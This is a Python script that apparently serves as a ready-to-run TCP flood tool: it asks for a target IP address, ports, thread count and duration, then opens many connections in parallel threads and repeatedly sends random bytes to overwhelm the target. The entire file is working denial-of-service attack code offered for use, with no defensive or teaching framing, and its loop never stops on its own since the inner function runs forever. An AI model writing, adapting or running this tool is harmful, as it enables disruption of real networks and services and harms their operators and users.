import socket
import threading
import random
import time
from concurrent.futures import ThreadPoolExecutor

# Function to generate and send TCP requests
def send_tcp_request(target_ip, target_ports, rpc_count, data_to_send):
    while True:
        for target_port in target_ports:
            try:
                # Create a TCP socket
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                # Disable Nagle's algorithm to send packets immediately
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                # Set a timeout for socket operations
                s.settimeout(0.9)
                # Connect to the target IP and port
                s.connect((target_ip, target_port))
                s.setblocking(False)  # Set socket to non-blocking mode

                # Send random bytes to the target
                for _ in range(rpc_count):
                    try:
                        s.sendall(data_to_send)  # Send the random bytes
                    except socket.error:
                        break
            except socket.error:
                pass
            finally:
                s.close()  # Ensure the socket is closed
        # Small delay to prevent excessive retries
        time.sleep(0.01)

# Function to run the TCP flood attack using multiple threads
def tcp_flood(target_ip, target_ports, thread_count, rpc_count, duration):
    end_time = time.time() + duration
    data_to_send = random.randbytes(1024)

    def thread_target():
        while time.time() < end_time:
            send_tcp_request(target_ip, target_ports, rpc_count, data_to_send)

    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        futures = [executor.submit(thread_target) for _ in range(thread_count)]
        for future in futures:
            future.result()  # Wait for all threads to complete

# Main function to get user input and start the attack
def main():
    target_ip = input("Enter the target IP address: ")
    target_ports = list(map(int, input("Enter the target ports (comma-separated): ").split(',')))
    thread_count = int(input("Enter the number of threads: "))
    rpc_count = int(input("Enter the number of RPCs per thread: "))
    duration = int(input("Enter the duration of the attack in seconds: "))

    # Start the TCP flood attack
    tcp_flood(target_ip, target_ports, thread_count, rpc_count, duration)

if __name__ == "__main__":
    main()
